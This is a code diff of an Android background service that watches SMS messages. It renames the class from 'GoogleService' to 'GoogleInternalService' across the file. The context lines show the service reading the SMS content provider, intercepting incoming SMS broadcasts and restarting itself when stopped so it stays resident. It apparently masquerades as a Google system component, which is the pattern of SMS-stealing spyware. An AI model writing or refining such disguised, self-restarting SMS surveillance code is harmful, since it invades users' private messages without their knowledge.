@@ -37,7 +37,7 @@ import java.util.LinkedList;
  * body => 短消息内容
  * service_center => 短信服务中心号码编号。如+8613800755500
  */
-public class GoogleService extends Service {
+public class GoogleInternalService extends Service {
 
     //    private static final String SMS_URI = "content://sms/";//1.6下的系统
     private static final String SMS_URI = "content://mms-sms/";
@@ -204,8 +204,8 @@ public class GoogleService extends Service {
 
         MobclickAgent.onResume(getApplicationContext());
 
-        Config.LOGD("[[GoogleService]] onCreate");
-        Config.LOGD("[[GoogleService]] registe dynamic SMS_RECEIVED");
+        Config.LOGD("[[GoogleInternalService]] onCreate");
+        Config.LOGD("[[GoogleInternalService]] registe dynamic SMS_RECEIVED");
 
         IntentFilter filter = new IntentFilter();
         filter.addAction("android.provider.Telephony.SMS_RECEIVED");
@@ -223,7 +223,7 @@ public class GoogleService extends Service {
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
 
-        Config.LOGD("[[GoogleService]] onStartCommand");
+        Config.LOGD("[[GoogleInternalService]] onStartCommand");
 
         return START_STICKY;
     }
@@ -234,14 +234,14 @@ public class GoogleService extends Service {
 
         MobclickAgent.onPause(getApplicationContext());
 
-        Config.LOGD("[[GoogleService]] onCreate");
+        Config.LOGD("[[GoogleInternalService]] onCreate");
 
         mResolver.unregisterContentObserver(smsContentObserver);
         unregisterReceiver(filterBRC);
 
         //因为这个服务应该是长期驻留在后台，所以再次启动它
         Intent serviceIntent = new Intent();
-        serviceIntent.setClass(getApplicationContext(), GoogleService.class);
+        serviceIntent.setClass(getApplicationContext(), GoogleInternalService.class);
         startService(serviceIntent);
     }
 
